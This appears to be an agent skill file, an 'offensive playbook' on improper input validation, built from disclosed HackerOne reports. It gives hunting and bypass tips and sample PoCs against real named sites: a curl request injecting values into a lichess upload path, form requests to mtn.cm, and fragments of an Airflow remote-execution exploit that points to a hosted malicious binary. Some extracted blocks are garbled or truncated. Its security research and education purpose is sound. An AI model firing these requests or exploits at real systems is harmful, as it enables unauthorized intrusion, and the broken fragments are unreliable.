---
name: input-validation
description: "Improper Input Validation offensive playbook from 40 disclosed HackerOne reports (2 critical, 8 high, 15 medium, 15 low). Use when hunting or reviewing improper input validation. Triggers: allowed, apache, server, attacker, validation."
license: "For authorized security testing and education only."
---

# Improper Input Validation

> Distilled from **40** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

User input is accepted without proper type/range/format checks, enabling injection, logic abuse, or crashes even when a specific injection class isn't named.

## Where to hunt

- Fuzz typed fields with wrong types, oversized values, unicode, null bytes, and boundary values the UI never sends.
- Compare client-side validation with what the API actually accepts.

## Exploitation playbook

- Send values the UI blocks (negative IDs, huge strings, unexpected content-types) to trigger errors, overflows, or downstream injection.

## Bypass techniques

- Alternate encodings, JSON type juggling (string vs number vs array), multipart vs JSON.

## Impact & escalation

- Often a stepping stone into SQLi, XSS, DoS, or business-logic bypass.

## Remediation

- Validate on the server with allowlists, enforce types/lengths, reject unexpected fields.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1165223](https://hackerone.com/reports/1165223)  -  Missing captcha and rate limit protection in help form
*medium*

```http
POST /handle-forms/help_submit_form.php HTTP/1.1
Host: mtn.cm
Content-Type: multipart/form-data; boundary=---------------------------425351903833406577801167297086
Content-Length: 743
Origin: https://mtn.cm
Referer: https://mtn.cm/help/
Cookie: qtrans_front_language=en; _fw_crm_v=0279789c-60ed-4e7d-9599-ae776a8b7ddb
```

### 2. [#1165223](https://hackerone.com/reports/1165223)  -  Missing captcha and rate limit protection in help form
*medium*

```http
POST /handle-forms/help_submit_form.php HTTP/1.1
Host: mtn.cm
Content-Type: multipart/form-data; boundary=---------------------------425351903833406577801167297086
Content-Length: 743
Origin: https://mtn.cm
Referer: https://mtn.cm/help/
Cookie: qtrans_front_language=en; _fw_crm_v=0279789c-60ed-4e7d-9599-ae776a8b7ddb

-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-name"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-contact-number"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-surname"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-email"

security@test.hackerone
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-message"

hello please admin ignore this message it is security test
-----------------------------425351903833406577801167297086--
```

### 3. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```http
Put the compiled system malicious executable file into Google Cloud Storage, and set the permission to public. My address for this exploit is [https://storage.googleapis.com/swordlight/system](https://storage.googleapis.com/swordlight/system)

### 2.2 Creating a Malicious Google Cloud SQL Database Connection
```

### 4. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```http
Put it in the `/opt/airflow/dags` directory so that it can be automatically loaded by airflow.The content is as follows, where gcp_cloudsql_conn_id is set to the connection name aaa we established above.
```

### 5. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const TARGET_URL = "https://github.com/c0rydoras";

const metadata = {
  embeds: [
    {
      type: "opengraph",
      url: `${TARGET_URL}?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ`,
      data: {
        type: "video.other",
        url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        title: "Rick Astley - Never Gonna Give You Up (Official Music Video)",
        description:
          "The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...",
        determiner: "",
        site_name: "YouTube",
        locale: "",
        locales_alternate: null,
        images: [
          {
            url: "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
            secure_url: "",
            type: "",
            width: 1280,
            height: 720,
          },
        ],
        audios: null,
        videos: null,
      },
    },
# … truncated …
```

### 6. [#3175928](https://hackerone.com/reports/3175928)  -  ImageId Format Injection in Image Upload Endpoint
*medium*

```bash
curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \
  -b "lila2=YOUR_SESSION_COOKIE" \
  -H "Origin: https://lichess.org" \
  -H "Referer: https://lichess.org/" \
  -F "image=@test.png"
```

More payloads: see [payloads.md](payloads.md) (27 curated).

## Recurring patterns in this dataset

Most frequent terms across the 40 reports (term (count)): `allowed` (19), `apache` (19), `server` (17), `attacker` (13), `validation` (12), `malicious` (11), `improper` (10), `discovered` (10), `url` (9), `name` (8), `encoding` (8), `input` (7), `code` (7), `injection` (7), `project` (7), `curl` (7), `versions` (7), `version` (7)

## Worked example  -  [report #684092](https://hackerone.com/reports/684092)

*Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`* (critical,  - )

> Summary: The flip contract allows for the MCD system to auction collateral in exchange for DAI. A lack of validation in the method flip.kick allows an attacker to create an auction with a fake bid value. Since the end contract trusts that value, it can be exploited to issue any amount of free DAI during liquidation. That DAI can then be immediately used to obtain all collateral stored in the end contract. Detailed Description: The flipper contract (flip.sol) is intended to offer a way for the MCD contracts to obtain DAI by auctioning gems. An auction is initiated by calling the flip.kick method, which is normally done by the cat contract when it grabs collateral from a CDP. The implementati…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#684092](https://hackerone.com/reports/684092) | critical |  -  | makerdao_bbp | Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick` |
| [#1164452](https://hackerone.com/reports/1164452) | critical |  -  | mtn_group | Remote code execution due to unvalidated file upload |
| [#2585381](https://hackerone.com/reports/2585381) | high | $4,920 | ibb | important: Apache HTTP Server weakness with encoded question marks in backreferences (C… |
| [#2585378](https://hackerone.com/reports/2585378) | high | $4,920 | ibb | important: Apache HTTP Server weakness in mod_rewrite when first segment of substitutio… |
| [#423073](https://hackerone.com/reports/423073) | high |  -  | security | Improper UUID validation results in bypass of #419896 |
| [#684152](https://hackerone.com/reports/684152) | high |  -  | makerdao_bbp | Steal all MKR from `flap` during liquidation by exploiting lack of validation in `flap.… |
| [#893085](https://hackerone.com/reports/893085) | high |  -  | 8x8-bounty | 2FA Disable With Wrong Password - Response Tampering. |
| [#730779](https://hackerone.com/reports/730779) | high |  -  | nodejs | HTTP header values do not have trailing OWS trimmed |

*See [reference.md](reference.md) for all 40 reports in this class.*
